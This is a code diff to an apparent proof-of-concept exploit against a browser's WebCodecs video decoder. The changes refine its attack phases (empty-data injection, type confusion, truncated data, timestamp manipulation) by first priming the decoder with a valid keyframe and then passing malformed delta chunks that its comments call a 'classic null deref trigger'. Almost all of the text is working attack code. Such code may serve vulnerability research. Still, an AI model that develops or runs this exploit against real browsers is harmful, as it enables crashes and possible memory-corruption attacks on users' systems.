@@ -182,12 +182,13 @@ function createTypeConfusedChunk(originalChunk) {
  * 
  * Empty data buffers can trigger null pointer dereferences in the
  * decoder's parsing logic when it tries to read headers/footers.
+ * Note: Use 'delta' type since empty data cannot be a valid keyframe.
  */
 function createEmptyChunk(timestamp = 1000000) {
     analyzer.logAttempt('empty-data', 'Zero-byte payload');
     
     return new EncodedVideoChunk({
-        type: "key",
+        type: "delta",  // Changed from 'key' - empty data can't be valid keyframe
         timestamp: timestamp,
         data: new Uint8Array(0)  // Empty data - classic null deref trigger
     });
@@ -384,17 +385,59 @@ document.addEventListener("DOMContentLoaded", async () => {
         }
         
         // ============================================================================
+        // Prime decoder with valid keyframe first
+        // This is required - decoder needs a valid keyframe before accepting any data
+        // ============================================================================
+        log("\n=== Priming decoder with valid keyframe ===");
+        
+        if (encodedVideoChunks.length > 0 && encodedVideoChunks[0].chunk.type === 'key') {
+            const original = encodedVideoChunks[0].chunk;
+            const buf = new Uint8Array(original.byteLength);
+            original.copyTo(buf);
+            
+            const keyChunk = new EncodedVideoChunk({
+                type: 'key',
+                timestamp: 0,
+                data: buf
+            });
+            
+            try {
+                videoDecoder.decode(keyChunk);
+                await videoDecoder.flush();
+                log("Decoder primed successfully");
+            } catch (e) {
+                log(`Failed to prime decoder: ${e.message}`, 'error');
+                return;
+            }
+        } else {
+            log("No valid keyframe available to prime decoder", 'error');
+            return;
+        }
+        
+        // Helper to check decoder state
+        const isDecoderReady = () => videoDecoder && videoDecoder.state !== 'closed';
+        
+        // ============================================================================
         // Phase 1: Empty Data Injection (Original PoC technique)
         // ============================================================================
         log("\n=== Phase 1: Empty Data Injection ===");
         
-        const emptyChunk = createEmptyChunk(1000000);
-        
-        try {
-            videoDecoder.decode(emptyChunk);
-            log("Empty chunk decode initiated (may crash async)");
-        } catch (e) {
-            log(`Empty chunk error: ${e.message}`, 'error');
+        if (!isDecoderReady()) {
+            log("Decoder not ready, skipping", 'warn');
+        } else {
+            // Use delta type - empty data can't be a valid keyframe
+            const emptyChunk = new EncodedVideoChunk({
+                type: "delta",
+                timestamp: 1000000,
+                data: new Uint8Array(0)
+            });
+            
+            try {
+                videoDecoder.decode(emptyChunk);
+                log("Empty chunk decode initiated (may crash async)");
+            } catch (e) {
+                log(`Empty chunk error: ${e.message}`, 'error');
+            }
         }
         
         // ============================================================================
@@ -403,14 +446,18 @@ document.addEventListener("DOMContentLoaded", async () => {
         if (encodedVideoChunks.length > 0 && CONFIG.enableTypeConfusion) {
             log("\n=== Phase 2: Type Confusion Attack ===");
             
-            const original = encodedVideoChunks[0].chunk;
-            const confusedChunk = createTypeConfusedChunk(original);
-            
-            try {
-                videoDecoder.decode(confusedChunk);
-                log("Confused chunk decode initiated");
-            } catch (e) {
-                log(`Type confusion error: ${e.message}`, 'error');
+            if (!isDecoderReady()) {
+                log("Decoder not ready, skipping", 'warn');
+            } else {
+                const original = encodedVideoChunks[0].chunk;
+                const confusedChunk = createTypeConfusedChunk(original);
+                
+                try {
+                    videoDecoder.decode(confusedChunk);
+                    log("Confused chunk decode initiated");
+                } catch (e) {
+                    log(`Type confusion error: ${e.message}`, 'error');
+                }
             }
         }
         
@@ -420,14 +467,25 @@ document.addEventListener("DOMContentLoaded", async () => {
         if (encodedVideoChunks.length > 0) {
             log("\n=== Phase 3: Truncated Data Attack ===");
             
-            const original = encodedVideoChunks[0].chunk;
-            const truncatedChunk = createTruncatedChunk(original, 10);
-            
-            try {
-                videoDecoder.decode(truncatedChunk);
-                log("Truncated chunk decode initiated");
-            } catch (e) {
-                log(`Truncation error: ${e.message}`, 'error');
+            if (!isDecoderReady()) {
+                log("Decoder not ready, skipping", 'warn');
+            } else {
+                const original = encodedVideoChunks[0].chunk;
+                const truncatedChunk = createTruncatedChunk(original, 10);
+                
+                // Change to delta since truncated data won't be valid keyframe
+                const corruptedChunk = new EncodedVideoChunk({
+                    type: 'delta',
+                    timestamp: Date.now() * 1000,
+                    data: truncatedChunk.data
+                });
+                
+                try {
+                    videoDecoder.decode(corruptedChunk);
+                    log("Truncated chunk decode initiated");
+                } catch (e) {
+                    log(`Truncation error: ${e.message}`, 'error');
+                }
             }
         }
         
@@ -437,24 +495,38 @@ document.addEventListener("DOMContentLoaded", async () => {
         if (encodedVideoChunks.length > 0 && CONFIG.enableTimestampManipulation) {
             log("\n=== Phase 4: Timestamp Manipulation ===");
             
-            const original = encodedVideoChunks[0].chunk;
-            
-            // Negative timestamp
-            const negativeChunk = createTimestampCorruptedChunk(original, -2000000);
-            try {
-                videoDecoder.decode(negativeChunk);
-                log("Negative timestamp chunk decode initiated");
-            } catch (e) {
-                log(`Negative timestamp error: ${e.message}`, 'error');
-            }
-            
-            // Large timestamp gap
-            const largeGapChunk = createTimestampCorruptedChunk(original, 1000000000);
-            try {
-                videoDecoder.decode(largeGapChunk);
-                log("Large gap chunk decode initiated");
-            } catch (e) {
-                log(`Large gap error: ${e.message}`, 'error');
+            if (!isDecoderReady()) {
+                log("Decoder not ready, skipping", 'warn');
+            } else {
+                const original = encodedVideoChunks[0].chunk;
+                
+                // Negative timestamp - use delta type
+                const negativeChunk = new EncodedVideoChunk({
+                    type: 'delta',
+                    timestamp: -2000000,
+                    data: new Uint8Array(10)
+                });
+                try {
+                    videoDecoder.decode(negativeChunk);
+                    log("Negative timestamp chunk decode initiated");
+                } catch (e) {
+                    log(`Negative timestamp error: ${e.message}`, 'error');
+                }
+                
+                // Large timestamp gap
+                if (isDecoderReady()) {
+                    const largeGapChunk = new EncodedVideoChunk({
+                        type: 'delta',
+                        timestamp: 1000000000,
+                        data: new Uint8Array(10)
+                    });
+                    try {
+                        videoDecoder.decode(largeGapChunk);
+                        log("Large gap chunk decode initiated");
+                    } catch (e) {
+                        log(`Large gap error: ${e.message}`, 'error');
+                    }
+                }
             }
         }
         
